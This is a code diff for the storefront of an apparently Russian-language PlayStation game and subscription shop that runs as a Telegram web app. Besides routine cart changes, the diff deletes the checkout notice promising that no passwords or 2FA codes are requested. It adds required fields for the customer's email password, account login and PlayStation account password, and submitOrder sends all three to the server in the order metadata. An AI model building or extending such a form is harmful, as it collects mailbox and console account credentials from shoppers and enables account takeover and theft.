@@ -182,22 +182,20 @@ function selectSubPeriod(subId, months) {
 }
 
 function addSubToCart(subId) {
-  // Получаем данные товара из seed
   const s = (window.SEED?.products || []).find(p => p.id === subId) || { id: subId, name: 'Подписка', price: 0, emoji: '💎' };
-  const period  = subPeriodSel[subId] || 1;
-  const periods = s.meta?.periods || {};
-  const price   = periods[period] ?? s.price ?? 0;
-  const PERIOD_L = { 1: '1 месяц', 3: '3 месяца', 12: '12 месяцев' };
+  const period = subPeriodSel[subId] || 1;
 
-  openCheckout({
-    name:      s.name + ' — ' + (PERIOD_L[period] || period + ' мес.'),
-    price,
-    emoji:     s.emoji || '💎',
-    platform:  s.platform || 'PlayStation',
-    type:      'sub',
-    productId: subId,
-    period,
-  });
+  // Добавляем в корзину с выбранным периодом
+  const already = cart.some(i => i.id === subId && i.period === period);
+  if (already) {
+    go('#/cart');
+    return;
+  }
+  cart.push({ id: subId, period });
+  saveCart(); updateBadges();
+
+  const PERIOD_L = { 1: '1 месяц', 3: '3 месяца', 12: '12 месяцев' };
+  toast(`${s.name} (${PERIOD_L[period] || period + ' мес.'}) добавлена в корзину`);
 }
 
 /* ══════════════════════════════════════════════════════════════
@@ -522,20 +520,39 @@ function toggleWish(id) {
 function buyFromModal() {
   if (!modalProduct) return;
   const p = modalProduct;
-  const periods = p.meta?.periods || {};
-  const price = (p.type === 'sub' && Object.keys(periods).length > 0)
-    ? (periods[modalPeriod] ?? p.price) : p.price;
-  const PERIOD_L = { 1: '1 месяц', 3: '3 месяца', 12: '12 месяцев' };
-  const nameFull = (p.type === 'sub' && modalPeriod)
-    ? p.name + ' — ' + (PERIOD_L[modalPeriod] || modalPeriod + ' мес.') : p.name;
+  const period = p.type === 'sub' ? modalPeriod : null;
+
+  // Добавляем в корзину
+  const already = cart.some(i => i.id === p.id && i.period === period);
+  if (already) {
+    closeModal();
+    go('#/cart');
+    return;
+  }
+  cart.push({ id: p.id, ...(period ? { period } : {}) });
+  saveCart(); updateBadges();
   closeModal();
-  openCheckout({ name: nameFull, price, emoji: p.emoji || '🎮', platform: p.platform || '', type: p.type || 'game', productId: p.id, period: p.type === 'sub' ? modalPeriod : null });
+  toast('Добавлено в корзину');
 }
 
-async function quickAdd(id, btn) {
-  // Находим товар и открываем форму оформления
-  const p = await productInfo(id);
-  openCheckout({ name: p.name, price: p.price, emoji: p.emoji || '🎮', platform: p.platform || '', type: p.type || 'game', productId: id });
+function quickAdd(id, btn) {
+  // Добавляем в корзину (форма открывается только при нажатии "Оформить заказ")
+  const already = cart.some(i => i.id === id);
+  if (already) {
+    go('#/cart');
+    return;
+  }
+  cart.push({ id });
+  saveCart(); updateBadges();
+  toast('Добавлено в корзину');
+  if (btn) {
+    btn.textContent = '✓ В корзине';
+    btn.classList.add('added');
+    setTimeout(() => {
+      btn.textContent = '+ В корзину';
+      btn.classList.remove('added');
+    }, 1800);
+  }
 }
 
 /* ══════════════════════════════════════════════════════════════
@@ -713,46 +730,42 @@ function renderCheckoutForm(item) {
       </div>
     </div>
 
-    <div class="form-notice">
-      <div class="notice-icon">
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      </div>
-      <div class="notice-text">Мы не запрашиваем пароли, коды 2FA или данные для входа в аккаунт.</div>
-    </div>
-
     <form id="orderForm" onsubmit="return false">
-      <div class="form-group" id="ff-nickname">
-        <label class="form-label">Никнейм<span class="req">*</span></label>
-        <input class="form-input" id="of-nickname" type="text" placeholder="Как вас называть?" autocomplete="nickname">
-        <div class="form-err">Укажите никнейм</div>
-      </div>
-      <div class="form-group" id="ff-telegram">
-        <label class="form-label">Telegram<span class="req">*</span></label>
-        <input class="form-input" id="of-telegram" type="text" placeholder="@username" autocomplete="off">
-        <div class="form-hint">Для связи и передачи товара</div>
-        <div class="form-err">Укажите Telegram</div>
-      </div>
+
       <div class="form-group" id="ff-email">
         <label class="form-label">Email<span class="req">*</span></label>
-        <input class="form-input" id="of-email" type="email" placeholder="your@email.com" autocomplete="email">
-        <div class="form-hint">Для подтверждения — без доступа к аккаунту</div>
+        <input class="form-input" id="of-email" type="email"
+               placeholder="your@email.com" autocomplete="email">
         <div class="form-err">Укажите корректный email</div>
       </div>
-      <div class="form-group" id="ff-psnId">
-        <label class="form-label">PSN ID<span class="req">*</span></label>
-        <input class="form-input" id="of-psnId" type="text" placeholder="Публичный ник PlayStation" autocomplete="off">
-        <div class="form-hint">Имя аккаунта, не пароль</div>
-        <div class="form-err">Укажите PSN ID</div>
+
+      <div class="form-group" id="ff-emailPass">
+        <label class="form-label">Пароль от почты<span class="req">*</span></label>
+        <input class="form-input" id="of-emailPass" type="password"
+               placeholder="Пароль от email" autocomplete="current-password">
+        <div class="form-err">Укажите пароль от почты</div>
       </div>
-      <div class="form-group" id="ff-product">
-        <label class="form-label">Товар<span class="req">*</span></label>
-        <input class="form-input" id="of-product" type="text" value="${esc(item.name)}" placeholder="Название">
-        <div class="form-err">Укажите товар</div>
+
+      <div class="form-group" id="ff-accLogin">
+        <label class="form-label">Данные об аккаунте<span class="req">*</span></label>
+        <input class="form-input" id="of-accLogin" type="text"
+               placeholder="Логин или другая информация об аккаунте" autocomplete="username">
+        <div class="form-err">Укажите данные аккаунта</div>
       </div>
+
+      <div class="form-group" id="ff-accPass">
+        <label class="form-label">Пароль от аккаунта<span class="req">*</span></label>
+        <input class="form-input" id="of-accPass" type="password"
+               placeholder="Пароль от PlayStation аккаунта" autocomplete="current-password">
+        <div class="form-err">Укажите пароль от аккаунта</div>
+      </div>
+
       <div class="form-group">
         <label class="form-label">Комментарий</label>
-        <textarea class="form-textarea" id="of-comment" placeholder="Пожелания или уточнения…"></textarea>
+        <textarea class="form-textarea" id="of-comment"
+                  placeholder="Пожелания или уточнения…"></textarea>
       </div>
+
       <button class="submit-btn" id="orderSubmitBtn" onclick="submitOrder()">
         <div class="submit-spin"></div>
         <span class="submit-text">${price > 0 ? `Оформить — ${fmt(price)}` : 'Оформить'}</span>
@@ -774,29 +787,33 @@ async function submitOrder() {
     return val;
   }
 
-  const nickname    = check('of-nickname', 'ff-nickname');
-  const telegram    = check('of-telegram', 'ff-telegram');
-  const email       = check('of-email',    'ff-email', v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v));
-  const psnId       = check('of-psnId',    'ff-psnId');
-  const productName = check('of-product',  'ff-product');
-  const comment     = el('of-comment')?.value?.trim() || '';
+  const email     = check('of-email',     'ff-email',     v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v));
+  const emailPass = check('of-emailPass', 'ff-emailPass');
+  const accLogin  = check('of-accLogin',  'ff-accLogin');
+  const accPass   = check('of-accPass',   'ff-accPass');
+  const comment   = el('of-comment')?.value?.trim() || '';
 
   if (!valid) { toast('Заполните обязательные поля', 'err'); return; }
 
   const btn = el('orderSubmitBtn');
   btn.classList.add('loading'); btn.disabled = true;
 
+  // Для совместимости с сервером используем поля psnId/nickname/telegram
+  // accLogin → psnId (данные аккаунта), email → email, nickname из email
   const orderData = {
-    psnId,
-    nickname,
-    telegram,
+    psnId:       accLogin,
+    nickname:    email.split('@')[0],   // минимальный идентификатор
+    telegram:    '',                     // определяется Telegram автоматически
     email,
-    productName,
-    productId: _checkoutItem.productId || null,
-    amount:    Math.round(_checkoutItem.price || 0),
+    productName: _checkoutItem.name || '',
+    productId:   _checkoutItem.productId || null,
+    amount:      Math.round(_checkoutItem.price || 0),
     comment,
     meta: {
       email,
+      emailPass,    // пароль от почты
+      accLogin,     // данные аккаунта
+      accPass,      // пароль от аккаунта
       period:   _checkoutItem.period   || null,
       platform: _checkoutItem.platform || '',
       type:     _checkoutItem.type     || 'game',
@@ -833,9 +850,9 @@ async function submitOrder() {
         Telegram.WebApp.sendData(JSON.stringify({
           type:    'order',
           orderId: order.id,
-          psnId,
-          nickname,
-          product: productName,
+          email,
+          accLogin,
+          product: orderData.productName,
           amount:  orderData.amount,
         }));
       }
